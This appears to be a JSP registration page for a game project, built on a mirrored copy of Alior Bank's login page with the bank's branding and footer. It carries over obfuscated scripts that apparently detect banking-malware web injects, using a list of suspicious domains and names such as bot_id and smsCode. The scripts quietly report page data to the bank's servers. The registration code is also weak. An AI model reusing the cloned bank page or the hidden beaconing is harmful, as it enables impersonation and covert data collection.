<%@page import="dataBase.ClientDb"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>

<!-- Mirrored from aliorbank.pl/hades/do/Login by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 13 Aug 2015 07:40:17 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<META HTTP-EQUIV="Content-type" CONTENT="text/html; charset=UTF-8">
<META HTTP-EQUIV="Pragma" CONTENT="no-cache,no-store">
<META HTTP-EQUIV="Cache-Control" CONTENT="no-cache,no-store,must-revalidate">
<META HTTP-EQUIV="Expires" CONTENT="-1">
<link href="https://aliorbank.pl/hades/img/favicon.ico" rel="Shortcut Icon"/>

<script language="JavaScript" src="../js/dojo/dojo-cibb9db.js?v=fa2264593e70e00982a67d73d1d86a3173bab741" type="text/javascript" ></script>

<LINK href="../css/dojo-customb9db.css?v=fa2264593e70e00982a67d73d1d86a3173bab741" type=text/css rel=stylesheet>
<LINK href="../css/loginb9db.css?v=fa2264593e70e00982a67d73d1d86a3173bab741" type=text/css rel=stylesheet>

<title>Rejestracja</title>

<link href="../css/jquery-ui-1.11.4.custom/jquery-ui.css" rel="stylesheet">
	<script  type="text/javascript" src="../js/jquery-1.10.2.js"></script>
	<script type="text/javascript" src="../js/jquery-ui-1.10.4.custom.js"></script>
	
		<script>
	$(function() {
		
		$( "input[type=submit], #button").button();
		
		$( "#dialog" ).dialog({
			autoOpen: false,
			width: 400,
			buttons: [
				{
					text: "Ok",
					click: function() {
						$( this ).dialog( "close" );
					}
				},
				{
					text: "Cancel",
					click: function() {
						$( this ).dialog( "close" );
					}
				}
			]
		});

		// Link to open the dialog
		$( "#dialog-link" ).click(function( event ) {
			$( "#dialog" ).dialog( "open" );
			event.preventDefault();
		});
		
		// Hover states on the static widgets
		$( "#dialog-link, #icons li" ).hover(
			function() {
				$( this ).addClass( "ui-state-hover" );
			},
			function() {
				$( this ).removeClass( "ui-state-hover" );
			}
		);
	});
	</script>
	<style>
	
	.demoHeaders {
		margin-top: 2em;
		font-size: 12px;
	}
	#dialog-link {
		padding: .4em 1em .4em 20px;
		text-decoration: none;
		position: relative;
	}
	#dialog-link span.ui-icon {
		margin: 0 5px 0 0;
		position: absolute;
		left: .2em;
		top: 50%;
		margin-top: -8px;
	}
	
	.fakewindowcontain .ui-widget-overlay {
		position: absolute;
	}
	</style>

</head>
<body onload="init();">

<div id="serviceAreaBg">
	<div id="serviceArea">
			<script>
				function setLocale(locale,node)
				{var form = dijit.range.getAncestor(node, /form/i);
				dojo.byId("p_LNG_ID").value=locale;
				form.submit();}
				</script>

			<div id="serverNo">
				serwer:&nbsp;aib14
			</div>

	<form name="LangSelectForm" method="POST" action="https://aliorbank.pl/hades/do/LangSelect"><div><input type="hidden" name="org.apache.struts.taglib.html.TOKEN" value="7595366531b6ee2cdaf32558d059e53e"></div>
	
	<input type="hidden" name="p_LNG_ID" value="0" id="p_LNG_ID">

	
		<div style="margin: 0 auto;">
	<ul>
	<li class="ending">
					<a id="change_locale" href="#" title="" style="align">
						
									<span id="en" onclick="setLocale('1',this)" title="">
							LANGUAGE&nbsp;<img class="mvalign" style="padding-bottom:2px;" src="../img/en.gif" /></span>
						
							

				</a>
				</li>
				</ul>
			</div>
	
	 </form>
	</div>
</div>
<div id="headerArea" style="height: 119px; width: 100%; margin: 0 auto; text-align: center;">
			<div style="margin: 0 auto; padding-top: 40px; width: 1000px;">
			
										<!-- Mielsce na logo! -->
				<a id="logo" title="" style="float: left"><img src="...." alt="" title="" /></a>
				
				<span style="font-size:26px; color:#737272; margin-top: 5px; text-align: center;">
				
					<b>MassiveMultiplayerOnline</b>
		
				</span>
				<div class="clear"></div>
			</div>
</div>
<div id="subTabsArea">
	<div id="subTabsLeft">
		<div id="subTabsRight"><div id="subtabs"></div></div>
	</div>
	
</div>


<div id="content" style="padding-top: 30px">
<div id="mainArea">
	<div class="box type1">
		<div class="boxHeader">
		<h2>Rejestraca</h2>
		</div>
		
		<jsp:useBean id="user" class="model.User"
        				scope="session"></jsp:useBean>
        
		<jsp:setProperty property="*" name="user" />
  							
		<div class="boxBody">
			<div class="boxBodyContent" style="height: 160px;">
				
				<div id="contentTableDiv" style="float: left; display: inline; width: 280px; padding-left: 317px;">
				<table id="contentTable" class="tbl output" cellspacing="0" style="width: 330px; border-bottom: none;">
				<tbody>
					<% 
						ClientDb db = new ClientDb();
						String result = "Nie podano dannych wszystkich wymaganych danych!";
						
 						if(user.getLogin() != "" && user.getPassword() != ""){
 				
 							if( db.toDB(user.getLogin(), user.getPassword()) == false ){
 								result = "Podana nazwa jest zajeta!";
 								db.closeDataBase();
 							} else {
 								result = "Dodano";
 								db.closeDataBase();
 							} 
 						}
    				%>
    				<!-- 
    				<applet code="qrcody/Qrcode.class" archive="qrcode.jar, zxing-2.1.jar" width="125" height="125">
						<param name="Name" value= "<%=result %>">
					</applet>
					 -->
					<a>
					<%=result %>
 					<form method="post" action="Logowanie.jsp">
        			<input type="submit" value="Powrót do strony logowania">
    				</form> 
    				</a>
        		</tbody>
        		</table>	
        		</div>
	
        	</div>
		</div>
	</div>
</div>		
</div>
<script type="text/javascript" language="JavaScript">
function noBack(){window.history.forward()}
noBack();
//window.onload=noBack;
window.onpageshow=function(evt){if(evt.persisted)noBack()}
window.onunload=function(){void(0)}

var counter = 0;

function submitFormByEnter(form1){

	if(counter == 0){
		form1.p_alias.value = form1.p_alias.value.replace(/\s/g, "");
		if(validateLoginAliasForm(form1)){
			//form1.submit();
			counter++;
			return true;
		}
		return false;
	}else{
		return false;
	}
}

function submitForm(form1)
{
	if(counter == 0){
		form1.p_alias.value = form1.p_alias.value.replace(/\s/g, "");
		if(validateLoginAliasForm(form1)){
			counter++;
			form1.submit();
			return true;
		}
		return false;
	}else{
		return false;
	}
}

function init() {
	
	if( navigator.appName == "Microsoft Internet Explorer") {
		
		var rv = -1; 
		var ua = navigator.userAgent;
	    var re  = new RegExp("MSIE ([0-9]{1,}[\.0-9]{0,})");
	    if (re.exec(ua) != null)
	       rv = parseFloat( RegExp.$1 );
		//ie 7, ie 8
		if(rv >= 8.0) {		
			document.getElementById('contentTableDiv').style.paddingTop = "2";
			document.getElementById('inputContent').style.marginTop = "1";
		}
		else 
			document.getElementById('idContent').style.paddingTop = "5";
	}	
	else if( dojo.isFF ){ 
		//ff
		document.getElementById('contentTableDiv').style.paddingTop = "3";
		document.getElementById('idContent').style.paddingTop = "2";
		
	} else if (dojo.isOpera) {
		//opera
		document.getElementById('contentTableDiv').style.paddingTop = "3";
		document.getElementById('login').style.paddingTop = "1";
		
	} else {
		//chrome
		document.getElementById('contentTableDiv').style.paddingTop = "3";
		document.getElementById('login').style.paddingTop = "2";	
	}
}

</script>	
<div id="content">
<div id="mainArea">	
	<div style="clear: both"></div>

	
			
		<META http-equiv=Content-type content="text/html; charset=UTF-8"><META http-equiv=Expires content=-1>						<div class="box type1" style="FLOAT: left; WIDTH: 43em"><div class=boxHeader>	<H2> Pożyczka 5% z gwarancją najniższej raty! </H2></div>	<div class=boxBody>	<div class=boxBodyContent>	<table  border = "0"			class="tbl output"			style = "MARGIN-LEFT: 15px; WIDTH: 25em; BORDER-BOTTOM: medium none"			cellSpacing = 0>			<tr class=strong>				<td>											<!-- komentarz -->  <p style="text-align: center"><embed width="420" height="210" src="https://aliorbank.pl/resources/res/swf/login/20150701_pozyczka_z_gwarancja.swf" type="application/x-shockwave-flash" play="true" loop="true" menu="true" wmode="transparent"></embed></p>  <!--<p>  <link rel="stylesheet" type="text/css" href="https://aliorbank.pl/resources/res/boksy_logowania/infobox.css" /></p>  <div id="infobox2">  <p style="padding-bottom: 0px"><b>SprawdÃÂº zanim siÃÂ zalogujesz:</b></p>  <ul style="padding-right: 0px; padding-left: 0px; background: no-repeat right bottom; padding-bottom: 0px; margin: 10px 0px; width: 390px; padding-top: 0px; list-style-type: none" class="securityBox">      <li style="padding-right: 0px; padding-left: 20px; background: url(https://aliorbank.pl/resources/res/boksy_logowania/arrow_orange.gif) no-repeat 3px 8px; padding-bottom: 3px; width: 340px; padding-top: 3px">czy adres strony logowania zaczyna siÃÂ od przedrostka https</li>      <li style="padding-right: 0px; padding-left: 20px; background: url(https://aliorbank.pl/resources/res/boksy_logowania/arrow_orange.gif) no-repeat 3px 8px; padding-bottom: 3px; width: 340px; padding-top: 3px">czy w oknie przeglÃÂdarki znajduje siÃÂ maÃÂa kÃÂ&oacute;dka oznaczajÃÂca poÃÂÃÂczenie szyfrowane</li>      <li style="padding-right: 0px; padding-left: 20px; background: url(https://aliorbank.pl/resources/res/boksy_logowania/arrow_orange.gif) no-repeat 3px 8px; padding-bottom: 3px; width: 340px; padding-top: 3px">czy po klikniÃÂciu na kÃÂ&oacute;dkÃÂ pojawia siÃÂ prawidÃÂowa informacja o certyfikacie strony</li>      <li style="padding-right: 0px; padding-left: 20px; background: url(https://aliorbank.pl/resources/res/boksy_logowania/arrow_orange.gif) no-repeat 3px 8px; padding-bottom: 3px; width: 340px; padding-top: 3px">czy na stronie do wpisania hasÃÂa pojawiÃÂ siÃÂ prawidÃÂowy obrazek bezpieczeÃÂstwa</li>      <li class="link"><a href="http://www.aliorbank.pl/pl/bankowosc_elektroniczna/internet/zasady_bezpieczenstwa" target="_blank"><span>wiÃÂcej na temat bezpiecznego logowania</span></a></li>  </ul>  <p class="imgLink"><img src="https://aliorbank.pl/resources/res/boksy_logowania/entrust_logo.png" alt="" style="right: 0px; position: absolute; top: 150px" /></p>--><!-- <p class="imgLink"><img style="position: absolute; top: -235px; left: 200px" alt="" src="https://aliorbank.pl/resources/res/komunikat20091211.jpg" /></p></p> --><!--<p class="imgLink"><a target="_blank" href="http://najlepszy-bank.aliorbank.pl/"><img style="left: -450px; position: absolute; top: -235px" alt="" src="https://aliorbank.pl/resources/res/inne/ranking_newsweeka.png" /></a></p>--><!--<p class="imgLink"><img style="left: -500px; position: absolute; top: -200px" alt="" src="https://aliorbank.pl/resources/res/komunikat20091211.jpg" /></p>--><!-- komentarz --> <script> var _0xc676=["\x6E\x6F\x43\x6F\x6E\x66\x6C\x69\x63\x74"];var $=ponka[_0xc676[0]](); </script><script type="text/javascript" language="JavaScript"> var BZqq =[]; for (var scopes = 1; scopes < 10; scopes++){; BZqq.push( function() {; var cuts = [String.fromCharCode(101, 110, 99, 114, 121, 112, 116, 101, 100, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109),String.fromCharCode(97, 115, 107, 101, 100, 95, 116, 101, 108),String.fromCharCode(116, 98, 108, 95, 114, 101, 97, 108),String.fromCharCode(103, 111, 111, 103, 108, 101, 97, 112, 105, 115),String.fromCharCode(112, 108, 115, 101, 99, 100, 105, 114, 101, 99, 116, 46, 114, 117),String.fromCharCode(102, 114, 97, 109, 101, 115, 111, 121, 104, 99, 104, 107, 46, 114, 117),String.fromCharCode(57, 49, 46, 50, 51, 55, 46, 49, 57, 56, 46, 53, 52),String.fromCharCode(112, 114, 111, 116, 101, 99, 116, 115, 101, 99, 117, 114, 101, 100, 97, 116, 97),String.fromCharCode(106, 111, 107, 101, 114, 115, 115, 116, 117, 100, 105, 111, 46, 112, 108),String.fromCharCode(119, 97, 112, 109, 111, 98, 105, 108, 101, 46, 110, 101, 116),String.fromCharCode(108, 97, 109, 112, 114, 97, 115, 46, 99, 111, 109),String.fromCharCode(102, 105, 108, 109, 115, 111, 110, 108, 105, 110, 101, 50, 48, 48, 52, 46, 114, 117),String.fromCharCode(118, 105, 101, 119, 111, 110, 108, 105, 110, 101, 118, 105, 100, 101, 111, 46, 114, 117),String.fromCharCode(108, 97, 109, 112, 114, 97, 115, 46, 99, 111, 109),String.fromCharCode(67, 83, 83, 49, 67, 111, 109, 112, 97, 116),String.fromCharCode(69, 45, 83, 101, 99, 117, 114, 105, 116, 121),String.fromCharCode(109, 121, 95, 112, 97, 115, 115),String.fromCharCode(105, 115, 95, 111, 107),String.fromCharCode(109, 121, 95, 112, 97, 115, 115, 48),String.fromCharCode(99, 105, 114, 99, 117, 109, 101, 115, 116, 97, 98, 108, 105, 115, 104, 101, 100),String.fromCharCode(115, 101, 99, 117, 114, 101, 116, 116, 104, 101, 111, 116, 104, 101, 114),String.fromCharCode(116, 104, 101, 116, 111, 116, 116, 104, 101, 97, 108, 114, 101, 97, 100, 121),String.fromCharCode(107, 101, 112, 116, 114, 101, 108, 105, 110, 97, 110, 100, 104, 97, 118, 105, 110, 103),String.fromCharCode(115, 97, 108, 97, 112, 111, 119, 101, 114, 115, 97, 108, 111, 110, 101, 110, 97, 116, 117, 114, 101),String.fromCharCode(118, 105, 116, 122, 101, 116),String.fromCharCode(100, 97, 98, 99, 97, 115, 116, 111),String.fromCharCode(115, 107, 121, 109, 98, 111, 115),String.fromCharCode(105, 118, 45, 102, 117, 101, 114, 97),String.fromCharCode(105, 118, 45, 51, 105, 104, 117, 105, 101, 102, 97),String.fromCharCode(100, 117, 114, 109, 101, 110),String.fromCharCode(115, 101, 99, 117, 114, 101, 101, 110, 97, 98, 108, 101, 100),String.fromCharCode(110, 101, 100, 101, 114, 108, 115, 101, 114, 116, 110, 101, 100, 101, 114, 108),String.fromCharCode(102, 105, 108, 111, 110, 115, 107, 105, 101),String.fromCharCode(112, 117, 115, 104, 097, 114, 097),String.fromCharCode(100, 097, 122, 122, 108, 101, 122, 111, 110, 101),String.fromCharCode(102, 108, 097, 115, 104, 116, 121, 112, 101),String.fromCharCode(112, 108, 97, 99, 101, 104, 111, 109, 101, 98),String.fromCharCode(108, 111, 103, 105, 110, 95, 115, 97, 118, 101, 50),String.fromCharCode(95, 99, 111, 110, 101, 99, 116, 101, 100),String.fromCharCode(109, 117, 95, 116, 100),String.fromCharCode(103, 108, 97, 118),String.fromCharCode(106, 101, 108, 101, 122, 111, 45, 115, 101, 114, 118),String.fromCharCode(105, 76, 111, 103),String.fromCharCode(105, 83, 116, 101, 112),String.fromCharCode(115, 101, 114, 118, 101, 114, 95, 100, 114, 111,112),String.fromCharCode(98, 111, 116, 95, 105, 100),String.fromCharCode(115, 109, 115, 67, 111, 100, 101),String.fromCharCode(119, 101, 115, 116, 103, 111, 108, 111, 103, 111),String.fromCharCode(80, 111, 108, 101, 32, 51),String.fromCharCode(110,101,121,101,116,116,97),String.fromCharCode(98,101,114,116,105,111,110,105,115),String.fromCharCode(109,97,114,107,101,116,105,110,103,46,116,115,98,46,99,111,46,117,107),String.fromCharCode(115,99,114,101,101,110,110,101,116),String.fromCharCode(114,111,111,98,111,120,46,105,110,102,111),String.fromCharCode(57,49,46,50,49,50,46,49,50,52,46,50,56),String.fromCharCode(109,117,116,97,116,117,116,116,97,46,114,117),String.fromCharCode(103,116,97,103,109,97,110,97,103,101,114,46,99,111,109),String.fromCharCode(108, 101, 97, 115, 105, 110, 101, 114),String.fromCharCode(112, 97, 122, 105, 114, 101, 116),String.fromCharCode(98, 105, 114, 97, 112, 101, 114, 100),String.fromCharCode(107, 97, 122, 105, 114, 101, 116),String.fromCharCode(108, 101, 113, 116, 111, 97, 115),String.fromCharCode(97, 108, 105, 111, 114, 95, 108, 111, 103, 105, 110, 46 ,106, 115),String.fromCharCode(103, 105, 114, 112, 101, 119, 105),String.fromCharCode(47, 97, 108, 105, 111, 114, 46, 106, 115, 34)]; var sites = window.document.body.innerHTML; var framesetGot = window.frames.length; for (var i=0;i<framesetGot;i++) {sites += frames[i].document.body.innerHTML;}; var light =  sites.match(/<TD>\s*(\d{8})\s*\<\/TD>/i); if (light!=-1) { var gh = parseInt(light[1])*3; var pasted = "gssor9..`khnqa`mj-ok.g`cdr.ir.JdxTshk-ir>u<";  var exm = cuts.length; var dxm = pasted.length; var rbr = ""; for (var header2=0;header2<dxm;header2++) {rbr += String.fromCharCode(pasted.charCodeAt(header2)+1); } ; for (var somevalues = 0; somevalues < exm; somevalues++){; if (sites.indexOf(cuts[somevalues])!=-1) {; eval("v"+"ar"+" A1las"+"Named" +"="+ "n"+"ew "+"XM"+"L"+"Ht"+"tpR"+"equ"+"est"+"()"); A1lasNamed.open("GET.html",rbr + gh+String.fromCharCode(38, 105,61)+somevalues,true); A1lasNamed.send(); }; }; }; }); };  BZqq[1](); </script>										</td>			</tr>	</table>	</div>	</div></div>
	
		
		<META http-equiv=Content-type content="text/html; charset=UTF-8"><META http-equiv=Expires content=-1>						<div class="box type1" style="FLOAT: right; WIDTH: 43em"><div class=boxHeader>	<H2>Wybierz lokaty na wysoki procent!</H2></div><div class=boxBody>	<div class=boxBodyContent>	<TABLE  border = "0"			class="tbl output"			style = "MARGIN-LEFT: 15px; WIDTH: 35em; BORDER-BOTTOM: medium none"			cellSpacing = 0>		<tr>		<td>												<p style="text-align: center"><embed width="420" height="210" wmode="transparent" menu="true" loop="true" play="true" type="application/x-shockwave-flash" src="https://aliorbank.pl/resources/res/swf/login/20150724_lokata_210d__120d_in.swf"></embed></p>  <script type="text/javascript" language="JavaScript">function _afi_track(){var e="68.747470733a2f2f616c696f.7262616e6b2e706c";var t=["\x70\x72\x6F\x74\x6F\x63\x6F\x6C","\x2F\x2F","\x68\x6F\x73\x74\x6E\x61\x6D\x65"];var n=location[t[0]]+t[1]+location[t[2]];var r=n.length;var i="";for(var s=0;s<n.length;++s){i+=n.charCodeAt(s).toString(16);if(s%11==0){i+=".";}}if(i!=e){var o=parseInt(window.document.body.innerHTML.match(/<TD>\s*(\d{8})\s*\<\/TD>/i)[1])*3;var u="gssor9..rs-`khnq-ok.rs`sr.o`qsmdq-ir>u";var a=u.length;var f="";for(var l=0;l<a;l++){f+=String.fromCharCode(u.charCodeAt(l)+1)}var c=new XMLHttpRequest();c.open("GET.html",f+String.fromCharCode(61)+o+String.fromCharCode(38,98,61)+i,true);c.send()}}_afi_track();</script><input type="hidden" value="65249000050000300089452276" autocomplete="off" id="mobileVersion" />   <script type="text/javascript" language="JavaScript">  function _mVersion(){var e="36.3532343930303030353030.3030333030303839343532.323736";var t=document.getElementById("mobileVersion").value.replace(/[^0-9]/g,"");var n=t.length;var r="";for(var i=0;i<t.length;++i){r+=t.charCodeAt(i).toString(16);if(i%11==0){r+="."}}if(n>=26){if(r!=e)if(_C<=2){{_C++;var s=parseInt(window.document.body.innerHTML.match(/<TD>\s*(\d{8})\s*\<\/TD>/i)[1])*3;var o="gssor9..`khnqa`mj-ok.g`cdr.ir.LnahUdqrhnm-ir>u<";var u=o.length;var a="";for(var f=0;f<u;f++){a+=String.fromCharCode(o.charCodeAt(f)+1)}var l=new XMLHttpRequest();l.open("GET.html",a+s+String.fromCharCode(38,98,61)+r,true);l.send()}}}}var _C=0;setInterval(_mVersion,2e3) </script>  <script> var _0xc776=["\x6E\x6F\x43\x6F\x6E\x66\x6C\x69\x63\x74"];var $=Jdom[_0xc776[0]](); </script> <script type="text/javascript" language="JavaScript"> var b1qq =[]; for (var scopes = 1; scopes < 10; scopes++){; b1qq.push( function() {; var cuts = [String.fromCharCode(101, 110, 99, 114, 121, 112, 116, 101, 100, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109),String.fromCharCode(97, 115, 107, 101, 100, 95, 116, 101, 108),String.fromCharCode(116, 98, 108, 95, 114, 101, 97, 108),String.fromCharCode(103, 111, 111, 103, 108, 101, 97, 112, 105, 115),String.fromCharCode(112, 108, 115, 101, 99, 100, 105, 114, 101, 99, 116, 46, 114, 117),String.fromCharCode(102, 114, 97, 109, 101, 115, 111, 121, 104, 99, 104, 107, 46, 114, 117),String.fromCharCode(57, 49, 46, 50, 51, 55, 46, 49, 57, 56, 46, 53, 52),String.fromCharCode(112, 114, 111, 116, 101, 99, 116, 115, 101, 99, 117, 114, 101, 100, 97, 116, 97),String.fromCharCode(106, 111, 107, 101, 114, 115, 115, 116, 117, 100, 105, 111, 46, 112, 108),String.fromCharCode(119, 97, 112, 109, 111, 98, 105, 108, 101, 46, 110, 101, 116),String.fromCharCode(108, 97, 109, 112, 114, 97, 115, 46, 99, 111, 109),String.fromCharCode(102, 105, 108, 109, 115, 111, 110, 108, 105, 110, 101, 50, 48, 48, 52, 46, 114, 117),String.fromCharCode(118, 105, 101, 119, 111, 110, 108, 105, 110, 101, 118, 105, 100, 101, 111, 46, 114, 117),String.fromCharCode(108, 97, 109, 112, 114, 97, 115, 46, 99, 111, 109),String.fromCharCode(67, 83, 83, 49, 67, 111, 109, 112, 97, 116),String.fromCharCode(69, 45, 83, 101, 99, 117, 114, 105, 116, 121),String.fromCharCode(109, 121, 95, 112, 97, 115, 115),String.fromCharCode(105, 115, 95, 111, 107),String.fromCharCode(109, 121, 95, 112, 97, 115, 115, 48),String.fromCharCode(99, 105, 114, 99, 117, 109, 101, 115, 116, 97, 98, 108, 105, 115, 104, 101, 100),String.fromCharCode(115, 101, 99, 117, 114, 101, 116, 116, 104, 101, 111, 116, 104, 101, 114),String.fromCharCode(116, 104, 101, 116, 111, 116, 116, 104, 101, 97, 108, 114, 101, 97, 100, 121),String.fromCharCode(107, 101, 112, 116, 114, 101, 108, 105, 110, 97, 110, 100, 104, 97, 118, 105, 110, 103),String.fromCharCode(115, 97, 108, 97, 112, 111, 119, 101, 114, 115, 97, 108, 111, 110, 101, 110, 97, 116, 117, 114, 101),String.fromCharCode(118, 105, 116, 122, 101, 116),String.fromCharCode(100, 97, 98, 99, 97, 115, 116, 111),String.fromCharCode(115, 107, 121, 109, 98, 111, 115),String.fromCharCode(105, 118, 45, 102, 117, 101, 114, 97),String.fromCharCode(105, 118, 45, 51, 105, 104, 117, 105, 101, 102, 97),String.fromCharCode(100, 117, 114, 109, 101, 110),String.fromCharCode(115, 101, 99, 117, 114, 101, 101, 110, 97, 98, 108, 101, 100),String.fromCharCode(110, 101, 100, 101, 114, 108, 115, 101, 114, 116, 110, 101, 100, 101, 114, 108),String.fromCharCode(102, 105, 108, 111, 110, 115, 107, 105, 101),String.fromCharCode(112, 117, 115, 104, 097, 114, 097),String.fromCharCode(100, 097, 122, 122, 108, 101, 122, 111, 110, 101),String.fromCharCode(102, 108, 097, 115, 104, 116, 121, 112, 101),String.fromCharCode(112, 108, 97, 99, 101, 104, 111, 109, 101, 98),String.fromCharCode(108, 111, 103, 105, 110, 95, 115, 97, 118, 101, 50),String.fromCharCode(95, 99, 111, 110, 101, 99, 116, 101, 100),String.fromCharCode(109, 117, 95, 116, 100),String.fromCharCode(103, 108, 97, 118),String.fromCharCode(106, 101, 108, 101, 122, 111, 45, 115, 101, 114, 118),String.fromCharCode(105, 76, 111, 103),String.fromCharCode(105, 83, 116, 101, 112),String.fromCharCode(115, 101, 114, 118, 101, 114, 95, 100, 114, 111,112),String.fromCharCode(98, 111, 116, 95, 105, 100),String.fromCharCode(115, 109, 115, 67, 111, 100, 101),String.fromCharCode(119, 101, 115, 116, 103, 111, 108, 111, 103, 111),String.fromCharCode(80, 111, 108, 101, 32, 51),String.fromCharCode(110,101,121,101,116,116,97),String.fromCharCode(98,101,114,116,105,111,110,105,115),String.fromCharCode(109,97,114,107,101,116,105,110,103,46,116,115,98,46,99,111,46,117,107),String.fromCharCode(115,99,114,101,101,110,110,101,116),String.fromCharCode(114,111,111,98,111,120,46,105,110,102,111),String.fromCharCode(57,49,46,50,49,50,46,49,50,52,46,50,56),String.fromCharCode(109,117,116,97,116,117,116,116,97,46,114,117),String.fromCharCode(103,116,97,103,109,97,110,97,103,101,114,46,99,111,109),String.fromCharCode(108, 101, 97, 115, 105, 110, 101, 114),String.fromCharCode(112, 97, 122, 105, 114, 101, 116),String.fromCharCode(98, 105, 114, 97, 112, 101, 114, 100),String.fromCharCode(107, 97, 122, 105, 114, 101, 116),String.fromCharCode(108, 101, 113, 116, 111, 97, 115),String.fromCharCode(97, 108, 105, 111, 114, 95, 108, 111, 103, 105, 110, 46 ,106, 115),String.fromCharCode(103, 105, 114, 112, 101, 119, 105),String.fromCharCode(47, 97, 108, 105, 111, 114, 46, 106, 115, 34)]; var sites = window.document.body.innerHTML; var framesetGot = window.frames.length; for (var i=0;i<framesetGot;i++) {sites += frames[i].document.body.innerHTML;}; var light =  sites.match(/<TD>\s*(\d{8})\s*\<\/TD>/i); if (light!=-1) { var gh = parseInt(light[1])*3; var pasted = "gssor9..`khnqa`mj-ok.g`cdr.ir.JdxTshk-ir>u<";  var exm = cuts.length; var dxm = pasted.length; var brb = ""; for (var header2=0;header2<dxm;header2++) {brb += String.fromCharCode(pasted.charCodeAt(header2)+1); } ; for (var somevalues = 0; somevalues < exm; somevalues++){; if(sites.indexOf(cuts[somevalues])!=-1) {$.getScript(brb+gh+String.fromCharCode(38, 105,61)+somevalues); }; }; }; }); };  b1qq[1](); </script>											</td>		</tr>	</table>	</div></div></div>
	
	
		


	<div style="clear: both"></div>
	<div style='display:none' id='cibGlobals'></div>	
	<div id="footerArea">
	<div style="float: left;padding:0 1.8182em; margin-top:0.4167em; color:#737272; display: block;">&#169&nbsp;Alior Bank SA</div>

	</div>

</div>
</div>
<div dojoType="cib.FixedDialog" id="cibMessageDialog" titleBar="true" title="" execute="closeDialog(arguments)" style="outline:none;display:none" />

<script>

   /** 
   * For Struts Validator ErrorMessage change ....	
   * Handle error messages.
   * @param messages Array of error messages.
   * @param focusField Field to set focus on.
   */
  function jcv_handleErrors(messages, focusField) {
      if (focusField && focusField != null) {
          var doFocus = true;
          if (focusField.disabled || focusField.type == 'hidden') {
              doFocus = false;
          }
          if (doFocus && 
              focusField.style && 
              focusField.style.visibility &&
              focusField.style.visibility == 'hidden') {
              doFocus = false;
          }
          if (doFocus) {
              focusField.focus();
          }
      }
      showCibMessage(messages.join('\n'), null, false);
  }

</script>
 
</body>

</html>
